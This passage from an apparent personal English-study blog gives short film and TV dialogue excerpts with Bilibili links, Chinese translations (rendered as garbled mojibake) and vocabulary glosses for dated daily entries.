something</p><p>ä¸æ˜¯ï¼Œæ˜¯åœ¨è¿™åº§å¤§å¦å·¥ä½œçš„æŸä¸ªå¤§ä½¬ï¼Œæˆ‘çŒœä»–å¯èƒ½æ˜¯å¯¹ä½ æœ‰å¥½æ„Ÿäº†</p><ul><li><p>apparently adv.æ®è¯´ï¼Œè²Œä¼¼</p></li><li><p>bebig shot  å¤§ä½¬</p></li><li><p>have a crush on sb å¯¹æŸäººæœ‰å¥½æ„Ÿï¼Œæš—æ‹æŸäºº</p></li></ul><h2 id="8-7"><a href="#8-7" class="headerlink" title="8.7"></a>8.7</h2><p><a href="https://www.bilibili.com/video/BV17x4y1G7EH/">https://www.bilibili.com/video/BV17x4y1G7EH/</a></p><p>wanna you go on inï¼Ÿ</p><p>è¦è¿›æ¥åå—</p><p>noï¼Œwhy donâ€™t you set me up outside</p><p>ä¸äº†ï¼Œä½ ç»™æˆ‘åœ¨å¤–é¢æ‘†ä¸€æ¡Œå§</p><p>outside? Itâ€™s freezing out here</p><p>å¤–é¢ï¼Ÿå¤–é¢å†»æ­»äº†</p><p>well, a little cold never hurt anybody.</p><p>ä¸€ç‚¹å°å†·å†»ä¸åçš„</p><p>anything you say ,Frank .itâ€™ll be rignt up</p><p>å¬ä½ çš„frankï¼Œè¿™å°±ä¸Šèœ</p><p>My one guilty pleasure is a good rack of ribs even at seven thirty in the morning.I had the whole place to myself.</p><p>æˆ‘å”¯ä¸€ä¸€ä¸ªæœ‰ç½ªæ¶çš„ä¹è¶£æ˜¯ä¸€é¡¿å¥½çš„çƒ¤çŒªæ’ï¼Œå³ä½¿æ˜¯ä¸ƒç‚¹åŠè¿™ä¹ˆæ—©ã€‚æ•´ä¸ªåœ°å€å°±æˆ‘ä¸€ä¸ªäºº</p><ul><li>freezing adj.æå†·çš„ï¼›å†°ç‚¹ä»¥ä¸‹çš„</li><li>guilty pleasure ä½œæ¶çš„å¿«æ„Ÿ</li><li>rack of ä¸€æ’</li><li>rib è‚‹éª¨ï¼Œæ’éª¨</li></ul><h2 id="8-8"><a href="#8-8" class="headerlink" title="8.8"></a>8.8</h2><p><a href="https://www.bilibili.com/video/BV1i8411P7Wu">https://www.bilibili.com/video/BV1i8411P7Wu</a></p><p>whereâ€™s my driverâ€™s license,Oh there you go</p><p>æˆ‘çš„é©¾ç…§åœ¨å“ªé‡Œï¼Ÿå“¦ï¼Œç»™ä½ </p><p>Thatâ€˜s a school id card ,Iâ€™ll need a valid driverâ€™s license</p><p>è¿™æ˜¯å­¦ç”Ÿè¯ï¼Œæˆ‘éœ€è¦æœ‰æ•ˆçš„é©¾é©¶æ‰§ç…§</p><p>Oh,come on ,look at that face,donâ€™t you just wanna let me in?</p><p>å“¦ï¼Œè¡Œå•¦ï¼Œçœ‹çœ‹è¿™å¼ è„¸ï¼Œä½ ä¸æƒ³è®©æˆ‘è¿›å»å—?</p><p>youâ€˜re gonna need to make a u-turn and exit immediately</p><p>ä½ éœ€è¦æ‰å¤´ç«‹å³ç¦»å¼€</p><ul><li><p>there you go ç»™ä½ </p></li><li><p>driverâ€™s license é©¾ç…§</p></li><li><p>u-turn n.æ‰å¤´ï¼Œå¤§è½¬å˜</p><p>American health insurers, having long opposed this idea,have preformed a starting U-turn in recent weeks</p><p>ç¾å›½åŒ»ç–—ä¿é™©å…¬å¸ä¸€ç›´éƒ½åå¯¹è¿™ä¸€æƒ³æ³•ä½†æ˜¯ä»–ä»¬çš„æ€åº¦åœ¨æœ€è¿‘å‡ å‘¨æ¥äº†ä¸ªæƒŠäººçš„è½¬å˜</p></li></ul><h2 id="8-9"><a href="#8-9" class="headerlink" title="8.9"></a>8.9</h2><p><a href="https://www.bilibili.com/video/BV1pA411Z7u7">https://www.bilibili.com/video/BV1pA411Z7u7</a></p><p>babe,please donâ€™t smoke,itâ€™ll kill your palate</p><p>å®è´è¯·ä¸è¦å¸çƒŸï¼Œå®ƒä¼šç ´åä½ çš„å‘³è•¾</p><p>then my palate will die happy</p><p>é‚£æˆ‘çš„å‘³è•¾ä¹Ÿæ­»è€Œæ— æ†¾äº†</p><p>hey Margot,tonight is huge ,okay? The â€œflavor profilesâ€,itâ€™s all super dilicate</p><p>margot,ä»Šæ™šçœŸçš„å¾ˆé‡è¦ï¼Œå¥½å—ï¼Œéƒ½æ˜¯äº›å£æ„Ÿç»†è…»çš„èœè‚´</p><p>when you smokeï¼Œyou ruin your ability to be able appreciate themã€‚</p><p>ä½ æŠ½çƒŸçš„æ—¶å€™ï¼Œä½ å°±æ¯æ‰ä½ å»ä½“ä¼šä»–ä»¬çš„èƒ½åŠ›ï¼Œ</p><p>Oh come on </p><p>å“¦ï¼Œå¾—äº†å§</p><p>please please</p><p>ç§‹æ¢¨è†</p><ul><li><p>palate n.ä¸Šè…­ï¼›å‘³è§‰ï¼Œå“å°åŠ›</p><p>you have a picky palate</p><p>ä½ æœ‰ä¸€ä¸ªæŒ‘å‰”çš„å‘³è§‰</p></li><li><p>flavor profiles çƒ¹é¥ªå£å‘³</p></li><li><p>delicate adj.å¾®å¦™çš„ï¼Œéœ€è¦è°¨æ…å¤„ç†</p><p>so itâ€™s just a very delicate matter</p><p>æ‰€ä»¥å®ƒæ˜¯ä¸€ä¸ªéå¸¸éœ€è¦è°¨æ…å¤„ç†çš„äº‹</p></li></ul><h2 id="8-10"><a href="#8-10" class="headerlink" title="8.10"></a>8.10</h2><p><a href="https://www.bilibili.com/video/BV1jK411C7yE/">https://www.bilibili.com/video/BV1jK411C7yE/</a></p><p>marta ï¼Œi know three things,one I know he didnâ€™t commit suicide</p><p>æˆ‘çŸ¥é“ä¸‰ä»¶äº‹ï¼Œç¬¬ä¸€ï¼Œæˆ‘çŸ¥é“ä»–ä¸æ˜¯è‡ªæ€</p><p>what makes you think that</p><p>ä½ ä¸ºä»€ä¹ˆé‚£ä¹ˆæƒ³</p><p>i donâ€™t you think itï¼Œi know it,because i knew my granddad </p><p>æˆ‘ä¸æ˜¯æƒ³è±¡ï¼Œæˆ‘å°±æ˜¯çŸ¥é“ï¼Œå› ä¸ºæˆ‘äº†è§£æˆ‘å¤–å…¬</p><p>Maybe you and  I were the only two who knew him</p><p>å¯èƒ½åªæœ‰ä½ å’Œæˆ‘äº†è§£ä»–</p><p>so youâ€™re not gonna bullshit me on this</p><p>æ‰€ä»¥ä½ ä¸ä¼šåœ¨è¿™ä»¶äº‹ä¸Šç³Šå¼„æˆ‘</p><p>because twoï¼Œi know lying makes you puke</p><p>ç¬¬äºŒæˆ‘çŸ¥é“æ’’è°ä¼šè®©ä½ å‘•å</p><ul><li><p>commit suicide è‡ªæ€</p><p>Youâ€™re much more likely to commit suicide</p><p>ä½ å¾ˆæœ‰å¯èƒ½è‡ªæ€</p></li><li><p>puke v.n. å‘•å</p></li></ul><h2 id="8-11"><a href="#8-11" class="headerlink" title="8.11"></a>8.11</h2><p><a href="https://www.bilibili.com/video/BV1ER4y127FE">https://www.bilibili.com/video/BV1ER4y127FE</a></p><p>This guy took me to the movies once ,Halfway through ,he goes to the bathroom,and when he comes back ,he sits three rows in front of me and puts his arm around some random girl</p><p>æœ‰ä¸€æ¬¡ï¼Œæœ‰ä¸ªç”·çš„å¸¦æˆ‘çœ‹ç”µå½±ï¼Œçœ‹åˆ°ä¸€åŠï¼Œä»–å‡ºå»ä¸Šå•æ‰€ï¼Œå½“ä»–å›æ¥çš„æ—¶å€™ï¼Œä»–ç«Ÿç„¶ååœ¨æˆ‘å‰é¢ä¸‰æ’çš„åœ°æ–¹ï¼Œè¿˜æ‚ç€ä¸€ä¸ªä¸è®¤è¯†çš„å¥³å­©</p><p>he thought she was you?</p><p>ä»–æŠŠé‚£ä¸ªå¥³å­©è®¤æˆä½ äº†?</p><p>I didnâ€™t stick around to find out</p><p>æˆ‘æ²¡å¾…åˆ°æœ€åï¼Œä¸çŸ¥é“æ€ä¹ˆå›äº‹</p><ul><li>halfway through è¿›è¡Œåˆ°ä¸€åŠ</li><li>stick around é€—ç•™ï¼Œåœ¨é™„è¿‘å¾˜å¾Š</li></ul><h2 id="8-12"><a href="#8-12" class="headerlink" title="8.12"></a>8.12</h2><p><a href="https://www.bilibili.com/video/BV14R4y1276A/">https://www.bilibili.com/video/BV14R4y1276A/</a></p><p>sorry the train was late ,you look great,i am growing out my bangs</p><p>æŠ±æ­‰ï¼Œç«è½¦æ™šç‚¹äº†ï¼Œä½ çœ‹èµ·æ¥çœŸä¸é”™ï¼Œæˆ‘æ­£åœ¨ç•™æˆ‘çš„åˆ˜æµ·å‘¢</p><p>oh where is rick?</p><p>rickåœ¨å“ª</p><p>rickâ€™s on a business trip for his business</p><p>rickåœ¨å‡ºå·®ä¸­å‘¢ï¼Œä¸ºäº†ä»–çš„ç”Ÿæ„</p><p>oh nuts!I was looking forward to finally meeting himï¼Œat least this doesnâ€™t make balloon animals</p><p>çœŸæ˜¯çš„ï¼Œæˆ‘è¿˜æœŸå¾…ç€ç»ˆäºèƒ½è§åˆ°ä»–å‘¢ï¼Œè‡³å°‘è¿™æ¬¡è¿™ä¸ªä¸æ˜¯ä»¥è¿™æ°”çƒåŠ¨ç‰©ä¸ºç”Ÿçš„</p><ul><li>grow up é•¿å‡ºï¼Œç•™é•¿</li><li>bangs åˆ˜æµ·</li></ul><h2 id="8-13"><a href="#8-13" class="headerlink" title="8.13"></a>8.13</h2><p><a href="https://www.bilibili.com/video/BV1fv4y1y7uk">https://www.bilibili.com/video/BV1fv4y1y7uk</a></p><p>hey,tina</p><p>whatâ€˜t up ,gemma,Can I borrow some milk</p><p>æˆ‘èƒ½å€Ÿç‚¹ç‰›å¥¶å—</p><p>Sure ,what kind do you want ,we have almondï¼Œoatï¼Œcoconutï¼Œmacadamia</p><p>å½“ç„¶ï¼Œä½ è¦ä»€ä¹ˆæ ·çš„ï¼Œæˆ‘ä»¬æœ‰æä»çš„ï¼Œç‡•éº¦çš„ï¼Œæ¤°å­çš„ï¼Œå¤å¨å¤·æœçš„</p><p>OHï¼ŒSo you donâ€™t have milk,I just go to the store</p><p>å“¦ï¼Œä½ æ²¡æœ‰æ™®é€šç‰›å¥¶ï¼Œæˆ‘è¿˜æ˜¯å»å•†åº—ä¹°å§</p><p>waitï¼Œhang onï¼Œhang onï¼ŒBefore you go,I got you a presentï¼ŒItâ€™t  for our one year anniversary as friends</p><p>ç­‰ä¸‹ï¼Œå…ˆåˆ«èµ°ï¼Œæˆ‘ç»™ä½ å‡†å¤‡äº†ç¤¼ç‰©ï¼Œçºªå¿µæˆ‘ä»¬ä¸€å‘¨å¹´çš„å‹è°Š</p><ul><li>hang on ç­‰ä¸€ä¸‹</li><li>one year anniversary ä¸€å‘¨å¹´çºªå¿µ</li></ul><h2 id="8-14"><a href="#8-14" class="headerlink" title="8.14"></a>8.14</h2><p><a href="https://www.bilibili.com/video/BV1Zs4y147nv">https://www.bilibili.com/video/BV1Zs4y147nv</a></p><p>have you ever heard of a labordâ€™s chameleon</p><p>ä½ å¬è¯´è¿‡xxxå˜è‰²é¾™å—</p><p>canâ€™t say i have</p><p>æ²¡å¬è¯´è¿‡</p><p>itâ€™s alizard species in madagascar.The females lay their eggs before the winter and then all the adults die before thry hatch</p><p>æ˜¯é©¬è¾¾åŠ æ–¯åŠ çš„ä¸€ç§èœ¥èœ´ï¼Œé›Œæ€§èœ¥èœ´ä¼šåœ¨å†¬å¤©æ¥ä¸´å‰ä¸‹ç‚¹ï¼Œç„¶åæ‰€æœ‰æˆå¹´èœ¥èœ´åœ¨è›‹å­µåŒ–å‰å°±èµ°å‘ç”Ÿå‘½ç»ˆç‚¹</p><p>so. from the minute you born,no parentsï¼Œyouâ€™re totally on your own</p><p>æ‰€ä»¥ä½ ä¸€å‡ºç”Ÿå°±æ²¡çˆ¶æ¯ï¼Œå®Œå…¨é è‡ªå·±</p><ul><li><p>chameleon å˜è‰²é¾™ï¼Œå–„å˜çš„äºº</p><p>Opponents called him a political chameleon for shifting his position on a range of issues</p><p>åå¯¹è€…ç§°ä»–æ˜¯æ”¿æ²»å˜è‰²é¾™ï¼Œå› ä¸ºä»–åœ¨ä¸€ç³»åˆ—é—®é¢˜ä¸Šæ”¹å˜äº†ç«‹åœº</p></li><li><p>hatch v.å­µåŒ–ï¼Œå­µå‡º å¯†è°‹ç­–åˆ’</p></li><li><p>species  ç‰©ç§ï¼Œç§ç±»</p></li></ul><h2 id="8-15"><a href="#8-15" class="headerlink" title="8.15"></a>8.15</h2><p><a href="https://www.bilibili.com/video/BV168411A7fJ">https://www.bilibili.com/video/BV168411A7fJ</a></p><p>how did it go?</p><p>æ€ä¹ˆæ ·</p><p>It went good ,it was great actually</p><p>ä¸é”™ï¼Œå®é™…ä¸Šç›¸å½“æ£’</p><p>did he say anything</p><p>ä»–è¯´ä»€ä¹ˆäº†å—</p><p>My agency said if the pictures turned out good ,he might consider them for an editorial ,Do you think he would</p><p>æˆ‘ç»æµå…¬å¸è¯´ï¼Œè¦æ˜¯ç…§ç‰‡æ•ˆæœä¸é”™ï¼Œä»–ä¼šè€ƒè™‘åšæ—¶å°šå‹å½•ç”¨ï¼Œä½ è§‰å¾—ä¼šå—</p><p>I think he makes a lot of promises to young girls</p><p>æˆ‘è§‰çš„ä»–ç»™å¹´è½»å§‘å¨˜ä»¬åšäº†å¤ªå¤šè®¸è¯º</p><p>I should go before my meter runs out</p><p>æˆ‘è¯¥èµ°äº† ï¼Œåœè½¦æ—¶é—´å¿«ç”¨å®Œäº†</p><ul><li><p>turn out ç»“æœæ˜¯</p><p>waiting to seeing how things turn out</p><p>ç­‰ç€çœ‹äº‹æƒ…çš„å‘å±•</p></li></ul><h2 id="8-16"><a href="#8-16" class="headerlink" title="8.16"></a>8.16</h2><p><a href="https://www.bilibili.com/video/BV1pG4y1C7dm/">https://www.bilibili.com/video/BV1pG4y1C7dm/</a></p><p>A great true crime mystery unpeels itslef ,like an onion</p><p>è§£å¼€æ¡ˆä»¶çš„è°œå›¢å¾€å¾€å°±åƒå‰¥æ´‹è‘±ä¸€æ ·ï¼Œè¦å±‚å±‚é€’è¿›é€å±‚å‰¥è„±</p><p>First the crime ,then the characters ,and then their secrets</p><p>é¦–å…ˆè¦å¼„æ¸…æ¡ˆä»¶ï¼Œå†äº†è§£æ¡ˆä»¶äººç‰©ï¼Œæœ€åç›´æä»–ä»¬å†…å¿ƒä¹‹éšå¯†</p><p>The secrets are the fun part.whoâ€˜s telling the truth,who is laying What are then hiding</p><p>ç§˜å¯†æ‰æ˜¯æœ€æœ‰æ„æ€çš„ï¼Œè°è¨€çœŸï¼Œå­°è¨€å‡ï¼ŒçœŸå‡èƒŒåéšè—äº†ä»€ä¹ˆ</p><ul><li><p>unpeel å‰¥â€¦çš„çš®</p><p>we are going to unpeel the layers of assumptions</p><p>æˆ‘ä»¬å°†è¦å‰¥å»å‡è®¾çš„å¤–è¡£</p></li></ul><h2 id="8-17"><a href="#8-17" class="headerlink" title="8.17"></a>8.17</h2><p><a href="https://www.bilibili.com/video/BV1Dd4y1V7da/">https://www.bilibili.com/video/BV1Dd4y1V7da/</a></p><p>good morning</p><p>æ—©ä¸Šå¥½</p><p>good morning,how are you today (i ditnâ€™t really care how he was today,but i had learn to ask anyway)</p><p>æ—©ï¼Œä½ ä»Šå¤©å’‹æ ·ï¼Œ(æˆ‘å¹¶ä¸åœ¨ä¹ä»–æ€ä¹ˆæ ·ï¼Œä½†æˆ‘å­¦ä¼šäº†è¿˜æ˜¯è¦é—®å€™ä¸€ä¸‹)</p><p>iâ€˜m quite wall ,thank you for asking</p><p>æˆ‘å¾ˆå¥½ï¼Œè°¢è°¢å…³å¿ƒ</p><p>i had aï¼Œuhï¼Œprotein-rich breakfast that i ingested out side in the garden ,the weather was quite mild</p><p>æˆ‘ä»Šå¤©åœ¨å¤–é¢çš„èŠ±å›­äº«ç”¨äº†å¯Œå«è›‹ç™½è´¨çš„æ—©é¤ï¼Œå¤©æ°”å¾ˆæ¸©å’Œ</p><ul><li>protein-rich adj.å¯Œå«è›‹ç™½è´¨çš„</li><li>mild æ¸©å’Œçš„</li><li>ingest æ‘„å–ï¼›å’½ä¸‹ï¼›å¸æ”¶ï¼›æ¥å¾…</li></ul><h2 id="8-18"><a href="#8-18" class="headerlink" title="8.18"></a>8.18</h2><p><a href="https://www.bilibili.com/video/BV1AY411X7u1/">https://www.bilibili.com/video/BV1AY411X7u1/</a></p><p>whatâ€™s going on</p><p>æ€ä¹ˆäº†</p><p>Somethingâ€™s wrong with sheldon</p><p>sheleonæœ‰ç‚¹ä¸å¯¹</p><p>Whatâ€™s the matter baby ,have to tummy ache</p><p>æ€ä¹ˆäº†å®è´ï¼Œè‚šå­ç—›å—</p><p>I think itâ€™s an ulcer</p><p>æˆ‘è§‰å¾—æ˜¯æºƒç–¡</p><p>Donâ€™t be silly ,you mustâ€™ve eaten someting ,No. my sympthoms are consistent with an ulcer</p><p>åˆ«å‚»äº†ï¼Œä½ ä¸€å®šæ˜¯åƒåäº†ä»€ä¹ˆä¸œè¥¿äº†ï¼Œæ²¡æœ‰.æˆ‘çš„ç—‡çŠ¶å’Œæºƒç–¡ä¸€æ¨¡ä¸€æ ·</p><ul><li><p>tummy n.è‚šå­</p></li><li><p>symptoms n.ç—‡çŠ¶</p></li><li><p>be consistent with ä¸ä»€ä¹ˆç›¸ä¸€è‡´</p></li></ul><h2 id="8-19"><a href="#8-19" class="headerlink" title="8.19"></a>8.19</h2><p><a href="https://www.bilibili.com/video/BV1HM411B7et/">https://www.bilibili.com/video/BV1HM411B7et/</a></p><p>How may I help you ?</p><p>æœ‰ä»€ä¹ˆèƒ½é‚¦ä½ çš„ï¼Œ</p><p>Hi iâ€™m just looking for some new glasses</p><p>æˆ‘æƒ³ä¹°ä¸€å‰¯æ–°çœ¼é•œ</p><p>Pippa is the best at picking out frames</p><p>æœ€ä¼šæŒ‘é•œæ¡†äº†</p><p>Really,Did you bring your prescription</p><p>æ˜¯å—ï¼Œä½ å¸¦å¤„æ–¹äº†å—</p><p>No I actually havenâ€™t had my eyes checked in,like a few years.It might â€˜ve changed</p><p>æ²¡ï¼Œå…¶å®æˆ‘å¥½å‡ å¹´æ²¡æ£€æµ‹è¿‡çœ¼ç›äº†ï¼Œåº¦æ•°å¯èƒ½æœ‰å˜åŒ–</p><ul><li>prescriptionå¤„æ–¹ï¼Œè¯æ–¹</li></ul><h2 id="8-20"><a href="#8-20" class="headerlink" title="8.20"></a>8.20</h2><p><a href="https://www.bilibili.com/video/BV1xd4y1W7rR/">https://www.bilibili.com/video/BV1xd4y1W7rR/</a></p><p>Hey you surprised to see me</p><p>çœ‹åˆ°æˆ‘å¾ˆæƒŠè®¶å—</p><p>Well you proved youself again kidã€‚That was some swan dive you took</p><p>ä½ ç”¨é‚£ä¸ªç‡•å¼è·³æ°´å†ä¸€æ¬¡è¯æ˜äº†è‡ªå·±</p><p>You were just gonna leave me back there</p><p>ä½ æ‰“ç®—ä¸¢ä¸‹æˆ‘</p><p>It wouldâ€™t do any good havin us both locked up.Somebody had to get the cross</p><p>æˆ‘ä»¬éƒ½è¢«å…³èµ·æ¥æ²¡ä»€ä¹ˆå¥½å¤„</p><p>Holy shit ï¼Œyou got it .Hey mabe I should hold on to that forâ€¦.</p><p>å¤©å•Šï¼Œä½ æ‹¿åˆ°äº†</p><p>What ,you donâ€™t trust me</p><p>ä½ ä¸ä¿¡ä»»æˆ‘?</p><ul><li>dive v.è·³æ°´ï¼Œæ½œæ°´</li></ul><h2 id="8-21"><a href="#8-21" class="headerlink" title="8.21"></a>8.21</h2><p><a href="https://www.bilibili.com/video/BV1xR4y1b7BR">https://www.bilibili.com/video/BV1xR4y1b7BR</a></p><p>Paying off the balance</p><p>æ¥äº¤ä½™æ¬¾å—</p><p>Actually I came for an extension ,i need more time</p><p>å®é™…ä¸Šï¼Œæˆ‘æ˜¯æ¥ç”³è¯·å»¶æœŸçš„ï¼Œæˆ‘éœ€è¦æ›´å¤šæ—¶é—´</p><p>how much</p><p>å¤šä¹…</p><p>I donâ€™t know ,I sorta hit a financial snag</p><p>æˆ‘ä¸çŸ¥é“ï¼Œæˆ‘é‡åˆ°äº†ç‚¹ç»æµæ–¹é¢çš„å›°éš¾</p><p>Miss danisels ,If I could help I would ,but Iâ€™ve already agree to keep    this property off the market for two full weeks for you thatâ€™s the best I can doã€</p><p>å°å§ï¼Œå¦‚æœæˆ‘èƒ½å¸®ä½ çš„è¯ï¼Œæˆ‘ä¸€å®šä¼šå¸®ï¼Œä½†æ˜¯æˆ‘å·²ç»ç­”åº”ä¸ºä½ ä¿ç•™è¿™æ ‹æˆ¿äº§æ•´æ•´ä¸¤ä¸ªæ˜ŸæœŸï¼Œè¿™æ˜¯æˆ‘èƒ½åšçš„æœ€å¥½äº†</p><ul><li>balance å¹³è¡¡ ä½™æ¬¾</li><li>extension å»¶æœŸï¼Œæ‹“å±•</li></ul><h2 id="8-22"><a href="#8-22" class="headerlink" title="8.22"></a>8.22</h2><p><a href="https://www.bilibili.com/video/BV1rG4y1S7WA/">https://www.bilibili.com/video/BV1rG4y1S7WA/</a></p><p>so,thatâ€™s why you became a nanny?</p><p>è¿™ä¹Ÿæ˜¯ä½ å»å½“ä¿å§†çš„åŸå› å—</p><p>yes beacause when my  father found out ,hec cut me off</p><p>æ˜¯çš„ï¼Œå› ä¸ºæˆ‘çˆ¸çˆ¸å‘ç°æˆ‘è¾å­¦åï¼Œæ–­äº†æˆ‘çš„é’±è¢‹</p><p>Oh ,i am sorry,itâ€™s harsh</p><p>çœŸæ›¿ä½ ä¼¤å¿ƒï¼Œé‚£å¤ªæ®‹é…·äº†</p><p>no,itâ€™s wonderful ,i mean iâ€™d much rather have my freedom</p><p>ä¸ï¼Œè¿™æ ·æ‰å¥½å‘¢ï¼Œæˆ‘å®æ„¿æ‹¥æœ‰è‡ªç”±</p><p>otherwise iâ€™d be living a very predictable life in china</p><p>ä¸è®©æˆ‘åªèƒ½åœ¨ä¸­å›½è¿‡è¿™ä¸€çœ¼æœ›åˆ°åº•çš„ç”Ÿæ´»</p><p>you know itâ€™s funny,i grew up with nannies,and now i am one</p><p>æœ‰æ„æ€çš„æ˜¯æˆ‘å°æ—¶å€™è¢«ä¿å§†å¸¦å¤§ï¼Œå¦‚ä»Šæˆ‘å´æˆäº†ä¿å§†</p><ul><li><p>cut offåˆ‡æ–­ï¼Œä¸­æ–­ï¼Œéš”ç»</p><p>cut him off from his followers</p><p>é˜»æ–­ä»–å’Œä»–ç²‰ä¸çš„è”ç³»</p></li><li><p>harsh æ¶åŠ£çš„ï¼Œè‰°è‹¦çš„ï¼›ä¸¥å‰çš„</p><p>that can survive in harsh environments</p><p>é‚£æ ·èƒ½åœ¨æ¶åŠ£ç¯å¢ƒä¸­ç”Ÿå­˜ä¸‹å»</p></li><li><p>predictable å¯é¢„æµ‹çš„ï¼Œå¯é¢„æ–™çš„ï¼›è€å¥—ä¹å‘³çš„</p><p>your predictable output</p><p>ä½ çš„å¯é¢„æœŸçš„äº§é‡</p></li></ul><h2 id="8-23"><a href="#8-23" class="headerlink" title="8.23"></a>8.23</h2><p>iâ€™m not sure how i feel about the whole auditioning thing in general</p><p>æˆ‘ä¸å¤ªç¡®å®šæˆ‘å¯¹æ•´ä¸ªè¯•é•œè¿™ä»¶äº‹çš„æ„Ÿè§‰å¦‚ä½•</p><p>iâ€™m not sure itâ€™s that good for me.i might just give it a break</p><p>æˆ‘ä¸å¤ªç¡®å®šæ˜¯ä¸æ˜¯é€‚åˆæˆ‘ï¼Œæˆ‘å¯èƒ½è¦æ­‡ä¸€æ­‡</p><p>whatâ€™s wrong with you?what</p><p>ä½ æ€ä¹ˆäº†ï¼Œä»€ä¹ˆ</p><p>that sounds like quite a healthy chice ,I havenâ€™t heard you make one of those in a very long time</p><p>è¿™å¬èµ·æ¥æ˜¯ä¸€ä¸ªæ˜æ™ºçš„é€‰æ‹©ï¼Œæˆ‘å·²ç»å¾ˆé•¿ä¸€æ®µæ—¶é—´æ²¡å¬åˆ°ä½ æœ‰è¿™æ ·çš„æƒ³æ³•äº†</p><ul><li>auditioning v.è¯•é•œ</li></ul><h2 id="8-24"><a href="#8-24" class="headerlink" title="8.24"></a>8.24</h2><p><a href="https://www.bilibili.com/video/BV1z84y1V7Rg/">https://www.bilibili.com/video/BV1z84y1V7Rg/</a></p><p>and now ,we return to our first hockey game.</p><p>ç°åœ¨æˆ‘ä»¬å›åˆ°äº†ç¬¬ä¸€æ¬¡å†°çƒæ¯”èµ›çš„èµ›åœº</p><p>Okay but that hockey game was our first fight.</p><p>å¥½å§ï¼Œä½†æ˜¯é‚£åœºå†°çƒæ¯”èµ›æ˜¯æˆ‘ä»¬ç¬¬ä¸€æ¬¡åµæ¶</p><p>I donâ€™t know why we need to memorialize our first fight on our last date.</p><p>æˆ‘ä¸æ˜ç™½ä¸ºä»€ä¹ˆè¦åœ¨æˆ‘ä»¬æœ€åä¸€æ¬¡çº¦ä¼šçºªå¿µæˆ‘ä»¬ç¬¬ä¸€æ¬¡åµæ¶</p><p>First fight is momentous</p><p>ç¬¬ä¸€æ¬¡åµæ¶æ˜¯æä¸ºé‡è¦çš„</p><ul><li>memorialize vt.çºªå¿µï¼Œè¯·æ„¿</li><li>momentous é‡è¦çš„ï¼Œé‡å¤§çš„</li></ul><h2 id="8-25"><a href="#8-25" class="headerlink" title="8.25"></a>8.25</h2><p><a href="https://www.bilibili.com/video/BV1Rx4y1L7Qt">https://www.bilibili.com/video/BV1Rx4y1L7Qt</a></p><p>Where are you going, youâ€™re note going anywhere .</p><p>ä½ å»å“ªå„¿ï¼Œä½ å“ªä¹Ÿä¸èƒ½å»</p><p>whatever</p><p>æˆ‘å°±ä¸å¬</p><p>susan gardner,get your ass back in the house on the count of three or youâ€™re grounded</p><p>susan gardneræˆ‘æ•°åˆ°ä¸‰ç»™æˆ‘æ»šå›å±‹é‡Œå»ï¼Œå¦åˆ™ä½ å°±è¢«ç¦è¶³äº†</p><p>what makes you think youâ€™re so in control of what i do? </p><p>ä½ å‡­ä»€ä¹ˆè®¤ä¸ºä½ èƒ½æ§åˆ¶æˆ‘åšä»€ä¹ˆï¼Ÿ</p><p>i donâ€™t think .I know.itâ€™s so fack</p><p>æˆ‘å°±æ˜¯çŸ¥é“ï¼Œäº‹å®å¦‚æ­¤</p><ul><li>on the count of three æ•°åˆ°ä¸‰</li></ul><h2 id="8-26"><a href="#8-26" class="headerlink" title="8.26"></a>8.26</h2><p><a href="https://www.bilibili.com/video/BV1yx4y1j7E2/">https://www.bilibili.com/video/BV1yx4y1j7E2/</a></p><p>charlesï¼Œyouâ€™re not understanding me ,if my husband finds out that i had an affair he will file for divorceã€‚he will do anything</p><p>ä½ æ²¡æ˜ç™½æˆ‘çš„æ„æ€ï¼Œå¦‚æœæˆ‘ä¸ˆå¤«å‘ç°æˆ‘æœ‰å¤–é‡ï¼Œä»–ä¼šèµ·è¯‰ç¦»å©šï¼Œä»–ä»€ä¹ˆéƒ½åšçš„å‡ºæ¥</p><p>what do you mean?</p><p>ä»€ä¹ˆæ„æ€</p><p>heâ€™ll take my daughter.</p><p>ä»–ä¼šå¤ºèµ°æˆ‘çš„å¥³å„¿</p><p>really</p><p>yes , you donâ€™t know him .heâ€™s not like you</p><p>æ˜¯çš„ï¼Œä½ ä¸äº†è§£ä»–ï¼Œä»–å’Œä½ ä¸ä¸€æ ·</p><ul><li>divorce n.ç¦»å©š åˆ†å¼€</li><li>have an affair æœ‰å¤–é‡</li></ul><h2 id="8-27"><a href="#8-27" class="headerlink" title="8.27"></a>8.27</h2><p><a href="https://www.bilibili.com/video/BV1vM4y1X7Vs/">https://www.bilibili.com/video/BV1vM4y1X7Vs/</a></p><p>all right,so there are all these question for your profile that you can answer if you want to or note.</p><p>å¥½äº†ï¼Œè¿™äº›é’ˆå¯¹ä¸ªäººèµ„æ–™çš„é—®é¢˜ï¼Œä½ æƒ³ä¸æƒ³å›ç­”éƒ½è¡Œ</p><p>Like religious views.political views,prople who inspire you.</p><p>æ¯”å¦‚å®—æ•™ä¿¡ä»°ï¼Œæ”¿æ²»ç«‹åœºï¼Œè°æ¿€åŠ±ä½ </p><p>jules ostin</p><p>i am not trying to brown-nose you,but iâ€™ve been in business a long time and iâ€™ve never run across anyone quite like you. you do inspire.jules</p><p>æˆ‘ä¸æ˜¯æƒ³æ‹ä½ é©¬å±ï¼Œä½†æˆ‘åœ¨å•†ä¸šé‚»åŸŸå¾…äº†å¾ˆä¹…ï¼Œæˆ‘æ²¡é‡è§è¿‡æƒ³ä½ è¿™æ ·çš„äººï¼Œjulesï¼Œä½ çœŸçš„æœ‰æ¿€åŠ±æ€§</p><ul><li>brown nose æ‹é©¬å±</li></ul><h2 id="8-28"><a href="#8-28" class="headerlink" title="8.28"></a>8.28</h2><p><a href="https://www.bilibili.com/video/BV1LR4y1z7B6">https://www.bilibili.com/video/BV1LR4y1z7B6</a></p><p>when my anxiety is hight ,it feels like an absolute inability to make decisions</p><p>å½“æˆ‘ä¸¥é‡ç„¦è™‘çš„æ—¶å€™ï¼Œå°±æ„Ÿè§‰æˆ‘æ— æ³•åšå‡ºå†³å®šã€‚</p><p>Like ,I would rather not do something than decide what to do</p><p>æ¯”å¦‚ï¼Œæˆ‘å®æ„¿ä¸€äº›äº‹æˆ‘å¹²è„†å°±ä¸åšäº†ä¹Ÿä¸æƒ³å»åšå†³å®š</p><p>and itâ€™s almost paralyzing which is odd,cuz it seems like itâ€™s simple</p><p>è¿™å‡ ä¹ä»¤äººå´©æºƒï¼Œä½†è¿™å¾ˆå¥‡æ€ªå› ä¸ºåšå†³å®šçœ‹èµ·æ¥å¾ˆç®€å•</p><p>do you want go on a walk ,or sit on the couch and watch 